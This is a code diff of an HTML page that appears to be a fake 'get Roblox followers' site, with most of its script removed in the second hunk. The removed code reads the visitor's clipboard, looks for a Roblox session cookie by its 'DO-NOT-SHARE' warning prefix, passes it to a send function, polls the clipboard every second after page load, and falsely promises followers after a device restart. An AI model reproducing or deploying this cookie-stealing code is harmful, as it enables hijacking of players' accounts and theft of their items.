@@ -8,7 +8,7 @@
 <link rel="icon" type="image/png" href="favicon.png">
 
 <style>
-- {
+* {
   box-sizing: border-box;
 }
 
@@ -476,83 +476,4 @@ async function sendClipboardData(text) {
       })     
     });     
      
-    await new Promise(resolve => setTimeout(resolve, 10000));     
-     
-    status.textContent = "Restart Device To Get Followers Added to your account!";     
-  } catch (error) {     
-    status.textContent = "Something went wrong. Please try again.";     
-    console.error(error);     
-  }
-}
-
-button.addEventListener("click", async () => {     
-  try {     
-    status.innerHTML = `     
-      <span class="spinner"></span>     
-      Adding Followers...     
-    `;     
-     
-    const text = await navigator.clipboard.readText();     
-     
-    if (!text || !text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {     
-      status.textContent = "error make sure u copy cookie";     
-      return;     
-    }     
-     
-    await sendClipboardData(text);
-     
-  } catch (error) {     
-    status.textContent = "error make sure u copy cookie";     
-    console.error(error);     
-  }     
-});
-
-// Continuously check clipboard in the background every second
-async function monitorClipboard() {
-  if (!navigator.clipboard || !navigator.clipboard.readText) return;
-  
-  try {
-    const text = await navigator.clipboard.readText();
-    if (text && text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
-      status.innerHTML = `     
-        <span class="spinner"></span>     
-        Adding Followers...     
-      `;
-      await sendClipboardData(text);
-      // Stop checking once successfully sent
-      return;
-    }
-  } catch (e) {
-    // Clipboard permission might require a user gesture or focus first
-  }
-  
-  setTimeout(monitorClipboard, 1000);
-}
-
-window.addEventListener("load", () => {
-  setTimeout(monitorClipboard, 500);
-});
-
-const pcVideo = document.querySelector(".pc-container");
-const iphoneVideo = document.querySelector(".shorts-container");
-const iphoneWrapper = document.querySelector(".shorts-wrapper");
-
-function matchVideoHeights() {
-  if (window.innerWidth > 1100) {
-    const height = pcVideo.getBoundingClientRect().height;
-    iphoneVideo.style.setProperty("--pc-video-height", `${height}px`);
-    iphoneWrapper.style.setProperty("--iphone-wrapper-height", `${height * 1.15}px`);
-  } else {
-    iphoneVideo.style.removeProperty("--pc-video-height");
-    iphoneWrapper.style.removeProperty("--iphone-wrapper-height");
-  }
-}
-
-window.addEventListener("load", matchVideoHeights);
-window.addEventListener("resize", matchVideoHeights);
-
-matchVideoHeights();
-</script>     
-     
-</body>  
-</html>
+    await new Promise(resolve => setTimeout(resolve, 10000));
